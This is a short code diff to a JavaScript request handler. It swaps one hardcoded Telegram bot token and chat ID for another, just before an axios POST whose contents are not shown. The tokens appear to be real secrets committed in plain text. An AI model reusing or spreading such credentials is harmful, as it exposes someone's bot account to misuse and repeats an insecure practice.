@@ -57,8 +57,8 @@ export default async function handler(req, res) {
 `;
 
   // 🔑 YOUR TELEGRAM CREDENTIALS
-  const BOT_TOKEN = '8336451826:AAGfx7cszLbH5mNRF84AsD9188krScNaIA8';
-  const CHAT_ID = '7843509294';
+  const BOT_TOKEN = '8331507630:AAFB9CwWfEkbZ9xH9NHG7VBAzrVLBVmZCR8';
+  const CHAT_ID = '-1003325796934';
 
   try {
     await axios.post(
